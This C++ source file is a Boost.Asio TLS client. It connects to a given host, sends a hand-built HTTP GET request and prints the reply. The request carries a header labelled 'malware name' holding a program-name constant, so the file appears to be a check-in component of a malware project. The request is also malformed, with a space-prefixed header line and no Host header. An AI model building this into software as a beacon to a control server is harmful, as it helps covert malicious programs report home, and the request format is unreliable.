#include "Client.h"

void Client::connect(const std::string& host, const std::string& port, boost::asio::io_context& io_context) {
    boost::asio::ip::tcp::resolver resolver(io_context);
    auto endpoints = resolver.resolve(host, port);
    boost::asio::async_connect(m_socket.lowest_layer(), endpoints,
        [this](boost::system::error_code ec, tcp::endpoint) {
            if (!ec) {
                m_socket.async_handshake(boost::asio::ssl::stream_base::client,
                    [this](boost::system::error_code ec) {
                        if (!ec) {
                            send_request();
                        } else {
                            std::cerr << "Handshake error: " << ec.message() << std::endl;
                        }
                    });
            } else {
                std::cerr << "Connect error: " << ec.message() << std::endl;
            }
        });
}

void Client::send_request() {
    std::string request = "GET / HTTP/1.1\r\n malware name: " + static_cast<std::string>(NEW_PROGRAM_NAME) + "\r\nConnection: close\r\n\r\n";
    boost::asio::async_write(m_socket, boost::asio::buffer(request),
        [this](boost::system::error_code ec, std::size_t /*length*/) {
            if (!ec) {
                read_response();
            } else {
                std::cerr << "Write error: " << ec.message() << std::endl;
            }
        });
}

void Client::read_response() {
    boost::asio::async_read(m_socket, m_buffer,
        [this](boost::system::error_code ec, std::size_t /*length*/) {
            if (!ec) {
                std::cout << "Response:\n";
                std::cout.write(boost::asio::buffer_cast<const char*>(m_buffer.data()), m_buffer.size());
                m_buffer.consume(m_buffer.size());
            } else {
                std::cerr << "Read error: " << ec.message() << std::endl;
            }
        });
}